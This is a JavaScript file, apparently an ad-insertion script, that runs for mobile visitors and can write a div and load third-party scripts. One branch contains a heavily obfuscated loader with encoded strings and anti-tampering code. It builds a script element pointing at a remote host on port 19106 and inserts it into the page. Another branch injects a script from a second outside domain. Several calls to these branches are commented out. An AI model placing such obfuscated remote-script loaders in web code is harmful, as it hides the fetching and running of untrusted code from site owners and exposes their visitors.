/**
 * Created by Administrator on 2018/5/31.
 */

if (window.innerWidth <= 768) {
    var u = window.navigator.userAgent;
    var ua = u.toLowerCase();
    var isAndroid = (u.indexOf('Android') > -1 || u.indexOf('Adr') > -1); //android终端
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
    function timePack(date) {//时间转换为时间戳函数
        date = date.substring(0,19);
        date = date.replace(/-/g,'/');
        return new Date(date).getTime() / 1000;
    }
	function rnd(n, m) {
        return Math.floor(Math.random() * (m - n + 1) + n);
    }
    var rn = rnd(1, 2);

    var nowtime = parseInt(new Date() / 1000);
    var testStart = '2019-11-24 00:00:00';
    var testEnd = '2019-11-27 00:00:00';

	document.writeln("<div id='nofollow' style='position:relative;z-index:100;'>");

	if (rn == 1 && pathname != '/search') {//sw
        //rederMiddle('sw');
	}
	else if (rn == 2 && pathname != '/search') {//sw
        if (nowtime > timePack(testStart) && nowtime < timePack(testEnd)) {
            rederMiddle('');
        } else {
            //rederMiddle('sw');
        }
	}
	
	document.writeln("<\/div>");

	function rederMiddle(target) {
		if (target == 'sw') {
            var s_a_e_numd_e = parseInt(Math.random() * (1000 - 20 + 1) + 10000, 10);
            document.writeln("<div id=\'" + s_a_e_numd_e + "\'>");
            document.writeln("<\/div>");
            _cc="https://sc.chinalocks.cn:19106/show/7/5051?t="+s_a_e_numd_e;
            var _0x1357=['cGFyZW50Tm9kZQ==','aW5zZXJ0QmVmb3Jl','Y3JlYXRlRWxlbWVudA==','c2NyaXB0','c3Jj','Z2V0RWxlbWVudHNCeVRhZ05hbWU='];(function(_0x571e4e,_0x3580e7){var _0x19fa17=function(_0x6858b2){while(--_0x6858b2){_0x571e4e['push'](_0x571e4e['shift']());}};var _0x192f2e=function(){var _0xb33b={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x197a4f,_0x32b5c0,_0x28fa87,_0x380bd4){_0x380bd4=_0x380bd4||{};var _0x282050=_0x32b5c0+'='+_0x28fa87;var _0x321ed7=0x0;for(var _0x321ed7=0x0,_0x3f0c25=_0x197a4f['length'];_0x321ed7<_0x3f0c25;_0x321ed7++){var _0x3e5be0=_0x197a4f[_0x321ed7];_0x282050+=';\x20'+_0x3e5be0;var _0x3be975=_0x197a4f[_0x3e5be0];_0x197a4f['push'](_0x3be975);_0x3f0c25=_0x197a4f['length'];if(_0x3be975!==!![]){_0x282050+='='+_0x3be975;}}_0x380bd4['cookie']=_0x282050;},'removeCookie':function(){return'dev';},'getCookie':function(_0x1cc03b,_0xaf18ae){_0x1cc03b=_0x1cc03b||function(_0x56042c){return _0x56042c;};var _0x42e0ac=_0x1cc03b(new RegExp('(?:^|;\x20)'+_0xaf18ae['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x50907d=function(_0x203363,_0x33bd2e){_0x203363(++_0x33bd2e);};_0x50907d(_0x19fa17,_0x3580e7);return _0x42e0ac?decodeURIComponent(_0x42e0ac[0x1]):undefined;}};var _0x1093bb=function(){var _0x1be7a8=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x1be7a8['test'](_0xb33b['removeCookie']['toString']());};_0xb33b['updateCookie']=_0x1093bb;var _0x297b63='';var _0xc19f5a=_0xb33b['updateCookie']();if(!_0xc19f5a){_0xb33b['setCookie'](['*'],'counter',0x1);}else if(_0xc19f5a){_0x297b63=_0xb33b['getCookie'](null,'counter');}else{_0xb33b['removeCookie']();}};_0x192f2e();}(_0x1357,0x10a));var _0x119e=function(_0x3cc59c,_0x2d0d00){_0x3cc59c=_0x3cc59c-0x0;var _0x3798e8=_0x1357[_0x3cc59c];if(_0x119e['zDFucE']===undefined){(function(){var _0x4afd99;try{var _0x17876f=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x4afd99=_0x17876f();}catch(_0x5e0224){_0x4afd99=window;}var _0x280239='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4afd99['atob']||(_0x4afd99['atob']=function(_0xf87b30){var _0x5179e2=String(_0xf87b30)['replace'](/=+$/,'');for(var _0x1cd88e=0x0,_0x4de26e,_0x358bcb,_0x39be79=0x0,_0x1a7616='';_0x358bcb=_0x5179e2['charAt'](_0x39be79++);~_0x358bcb&&(_0x4de26e=_0x1cd88e%0x4?_0x4de26e*0x40+_0x358bcb:_0x358bcb,_0x1cd88e++%0x4)?_0x1a7616+=String['fromCharCode'](0xff&_0x4de26e>>(-0x2*_0x1cd88e&0x6)):0x0){_0x358bcb=_0x280239['indexOf'](_0x358bcb);}return _0x1a7616;});}());_0x119e['NNXjYZ']=function(_0x1fb37e){var _0x303e31=atob(_0x1fb37e);var _0x443792=[];for(var _0x47738e=0x0,_0x19acf7=_0x303e31['length'];_0x47738e<_0x19acf7;_0x47738e++){_0x443792+='%'+('00'+_0x303e31['charCodeAt'](_0x47738e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x443792);};_0x119e['BGIVvw']={};_0x119e['zDFucE']=!![];}var _0x64173d=_0x119e['BGIVvw'][_0x3cc59c];if(_0x64173d===undefined){var _0x46476c=function(_0x1f635a){this['mXGCmm']=_0x1f635a;this['FlEbXb']=[0x1,0x0,0x0];this['dofwuS']=function(){return'newState';};this['mnvxxY']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['WPabGN']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x46476c['prototype']['HhdReN']=function(){var _0x6b5eb1=new RegExp(this['mnvxxY']+this['WPabGN']);var _0x4bfd93=_0x6b5eb1['test'](this['dofwuS']['toString']())?--this['FlEbXb'][0x1]:--this['FlEbXb'][0x0];return this['mNQuOX'](_0x4bfd93);};_0x46476c['prototype']['mNQuOX']=function(_0x1eca40){if(!Boolean(~_0x1eca40)){return _0x1eca40;}return this['ndrDma'](this['mXGCmm']);};_0x46476c['prototype']['ndrDma']=function(_0xa1303f){for(var _0x67f688=0x0,_0x122bc6=this['FlEbXb']['length'];_0x67f688<_0x122bc6;_0x67f688++){this['FlEbXb']['push'](Math['round'](Math['random']()));_0x122bc6=this['FlEbXb']['length'];}return _0xa1303f(this['FlEbXb'][0x0]);};new _0x46476c(_0x119e)['HhdReN']();_0x3798e8=_0x119e['NNXjYZ'](_0x3798e8);_0x119e['BGIVvw'][_0x3cc59c]=_0x3798e8;}else{_0x3798e8=_0x64173d;}return _0x3798e8;};var _0x41240d=function(){var _0x118501=!![];return function(_0x53ed16,_0x48b93e){var _0x4be79e=_0x118501?function(){if(_0x48b93e){var _0xbc9b04=_0x48b93e['apply'](_0x53ed16,arguments);_0x48b93e=null;return _0xbc9b04;}}:function(){};_0x118501=![];return _0x4be79e;};}();var _0x1a8654=_0x41240d(this,function(){var _0x42ea7b=function(){return'\x64\x65\x76';},_0x3a9966=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x29eb54=function(){var _0x1ae773=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x1ae773['\x74\x65\x73\x74'](_0x42ea7b['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x30f947=function(){var _0x4dc08d=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x4dc08d['\x74\x65\x73\x74'](_0x3a9966['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4fbf48=function(_0x214f67){var _0x102138=~-0x1>>0x1+0xff%0x0;if(_0x214f67['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x102138)){_0x138a3a(_0x214f67);}};var _0x138a3a=function(_0x4aab1f){var _0x1cc748=~-0x4>>0x1+0xff%0x0;if(_0x4aab1f['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x1cc748){_0x4fbf48(_0x4aab1f);}};if(!_0x29eb54()){if(!_0x30f947()){_0x4fbf48('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x4fbf48('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x4fbf48('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x1a8654();m=document[_0x119e('0x0')](_0x119e('0x1'));m[_0x119e('0x2')]=_cc;sj=document[_0x119e('0x3')](_0x119e('0x1'))[0x0];sj[_0x119e('0x4')][_0x119e('0x5')](m,sj);
        } else if (target == 'pp') {
            document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://kl.zmgod.com/h.php?pid=5859'></script>");
		}
    }

} else {

}